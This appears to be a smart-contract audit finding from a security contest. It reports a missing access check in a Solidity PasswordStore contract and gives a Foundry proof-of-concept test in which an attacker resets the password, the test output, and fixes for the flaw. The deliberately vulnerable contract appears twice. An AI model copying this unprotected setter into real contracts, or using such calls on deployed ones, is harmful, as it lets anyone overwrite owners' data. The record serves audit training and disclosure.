{
  "Title": "Anyone can set the password by calling `PasswordStore::setPassword`",
  "Content": "# Anyone can set the password by calling `PasswordStore::setPassword`\n\n### Severity\nHigh Risk\n\n### Relevant GitHub Links\n<a data-meta=\"codehawks-github-link\" href=\"https://github.com/Cyfrin/2023-10-PasswordStore/blob/856ed94bfcf1031bf9d13514cb21b591d88ed323/src/PasswordStore.sol#L31C5-L40C6\">https://github.com/Cyfrin/2023-10-PasswordStore/blob/856ed94bfcf1031bf9d13514cb21b591d88ed323/src/PasswordStore.sol#L31C5-L40C6</a>\n\n\n## Summary\n\nThe `PasswordStore` contract assumes that only the owner can set the password. The `setPassword()` function modifies the `s_password` storage variable, where the password is set, but doesn't include access control meaning that anyone, including a malicious actor, can reset the owner's password.\n\n## Vulnerability Details\n\nThis vulnerability exists in the `PasswordStore::setPassword` function in the `PasswordStore.sol` file starting on [line 26](https://github.com/Cyfrin/2023-10-PasswordStore/blob/856ed94bfcf1031bf9d13514cb21b591d88ed323/src/PasswordStore.sol#L26).\n\nThe `setPassword()` function includes no access controls meaning that anyone can call it and modify the password:\n\n```solidity\n/*\n     * @notice This function allows only the owner to set a new password.\n     * @param newPassword The new password to set.\n     */\n    function setPassword(string memory newPassword) external {\n        s_password = newPassword;\n        emit SetNetPassword();\n    }\n```\n\nTo restrict who can modify the password, there needs to be a check that the function caller, the `msg.sender`, is the owner of the contract.\n\n## Impact\n\nA possible potential use case for this contract is that the owner, the address stored in the storage variable `s_owner`, wants to use the contract as a password manager. If someone else can modify the password then the contract will not return the password they intended to store. This negates the intended use of the contract.\n\nSince anyone, inluding malicious actors, can set the password, this opens up to the possibility that, depending on the context, these unsantisied and potentially malicious strings could be dangerous.\n\nAs per the following NatSpec comment: `This function allows only the owner to set a new password`, only the owner being able to set the password is the core assumtion, and functionality that does not hold, this is a high severity vulnerability.\n\n## Proof of Concept\n\n### Working Test Case\n\nThe `makeAddr` helper function is used to setup an `attacker` address to call the `setPasword()` function:\n\n```diff\ncontract PasswordStoreTest is Test {\n    PasswordStore public passwordStore;\n    DeployPasswordStore public deployer;\n    address public owner;\n+   address public attacker;\n\n    function setUp() public {\n        deployer = new DeployPasswordStore();\n        passwordStore = deployer.run();\n        owner = msg.sender;\n        // attacker address\n+       attacker = makeAddr(\"attacker\");\n    }\n}\n```\n\nThe following test, sets the password to `\"attackerPassword\"` using the attacker address. When run, this test will pass, demonstrating that the attacker can set the password:\n\n```solidity\n    function test_poc_non_owner_set_password() public {\n        // initiate the transaction from the non-owner attacker address\n        vm.prank(attacker);\n        string memory newPassword = \"attackerPassword\";\n        // attacker attempts to set the password\n        passwordStore.setPassword(newPassword);\n        console.log(\"The attacker successfully set the password:\" newPassword);\n    }\n```\n\nRun the test:\n\n```bash\nforge test --mt test_poc_non_owner_set_password -vvvv\n```\n\nWhich yields the following output:\n\n```bash\nunning 1 test for test/PasswordStore.t.sol:PasswordStoreTest\n[PASS] test_poc_non_owner_set_password() (gas: 20776)\nLogs:\n  The attacker successfully set the password: attackerPassword\n\nTraces:\n  [20776] PasswordStoreTest::test_poc_non_owner_set_password()\n    ├─ [0] VM::prank(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e])\n    │   └─ ← ()\n    ├─ [6686] PasswordStore::setPassword(attackerPassword)\n    │   ├─ emit SetNetPassword()\n    │   └─ ← ()\n    ├─ [0] console::log(The attacker successfully set the password: attackerPassword) [staticcall]\n    │   └─ ← ()\n    └─ ← ()\n\nTest result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.36ms\n```\n\n## Recommended Mitigation\n\nInclude access control to restrict who can call the `setPassword` function to be only the owner: `s_owner`. This can be achieved in two ways:\n\n1. Using an `if` statement, as used in the `getPassword` function, and revert with the `PasswordStore__NotOwer()` custom error if the address calling the function is not the owner:\n\n```diff\n    function setPassword(string memory newPassword) external {\n        // @audit check that the function caller is the owner of the contract\n+        if (msg.sender != s_owner) {\n+            revert PasswordStore__NotOwner();\n+        }\n        s_password = newPassword;\n        emit SetNetPassword();\n    }\n```\n\n2. Using an access modifier e.g. OpenZeppelin's `onlyOwner`. To use this modifier, the `PasswordStore` contract will need to inherit from OpenZeppelin's `Ownable` contract and call it's constructor inside the constructor of `PasswordStore`:\n\n```diff\n // @audit import the ownable contract from OpenZeppelin\n+ import \"@openzeppelin/contracts/ownership/Ownable.sol\";\n\n // @audit inherit from the Ownable contract\n+ contract PasswordStore is Ownable{\n    error PasswordStore__NotOwner();\n\n    address private s_owner;\n    string private s_password;\n\n    event SetNetPassword();\n\n+    constructor() Ownable() {\n        s_owner = msg.sender;\n    }\n}\n```\n\nAs per the OpenZeppelin documentation, by default, the `owner` of an `Ownable` contract is the account that deployed it, meaning that the `s_owner` state variable can be removed.\n\nUsing `onlyOwner` modifier adds logic to check that the `msg.sender` is the `owner` of the contract before executing the function's logic:\n\n```diff\n    /*\n     * @notice This function allows only the owner to set a new password.\n     * @param newPassword The new password to set.\n     */\n+   function setPassword(string memory newPassword) external onlyOwner {\n        s_password = newPassword;\n        emit SetNetPassword();\n    }\n```\n\n## Tools Used\n\n- [Forge](https://book.getfoundry.sh/forge/)\n",
  "Impact": "HIGH",
  "Source": "https://www.codehawks.com/contests/clnuo221v0001l50aomgo4nyn",
  "Code": [
    {
      "filename": "src/PasswordStore.sol",
      "content": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.18;\n\n/*\n * @author not-so-secure-dev\n * @title PasswordStore\n * @notice This contract allows you to store a private password that others won't be able to see. \n * You can update your password at any time.\n */\ncontract PasswordStore {\n    error PasswordStore__NotOwner();\n\n    address private s_owner;\n    string private s_password;\n\n    event SetNetPassword();\n\n    constructor() {\n        s_owner = msg.sender;\n    }\n\n    /*\n     * @notice This function allows only the owner to set a new password.\n     * @param newPassword The new password to set.\n     */\n    function setPassword(string memory newPassword) external {\n        s_password = newPassword;\n        emit SetNetPassword();\n    }\n\n    /*\n     * @notice This allows only the owner to retrieve the password.\n     * @param newPassword The new password to set.\n     */\n    function getPassword() external view returns (string memory) {\n        if (msg.sender != s_owner) {\n            revert PasswordStore__NotOwner();\n        }\n        return s_password;\n    }\n}"
    },
    {
      "filename": "src/PasswordStore.sol",
      "content": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.18;\n\n/*\n * @author not-so-secure-dev\n * @title PasswordStore\n * @notice This contract allows you to store a private password that others won't be able to see. \n * You can update your password at any time.\n */\ncontract PasswordStore {\n    error PasswordStore__NotOwner();\n\n    address private s_owner;\n    string private s_password;\n\n    event SetNetPassword();\n\n    constructor() {\n        s_owner = msg.sender;\n    }\n\n    /*\n     * @notice This function allows only the owner to set a new password.\n     * @param newPassword The new password to set.\n     */\n    function setPassword(string memory newPassword) external {\n        s_password = newPassword;\n        emit SetNetPassword();\n    }\n\n    /*\n     * @notice This allows only the owner to retrieve the password.\n     * @param newPassword The new password to set.\n     */\n    function getPassword() external view returns (string memory) {\n        if (msg.sender != s_owner) {\n            revert PasswordStore__NotOwner();\n        }\n        return s_password;\n    }\n}"
    }
  ]
}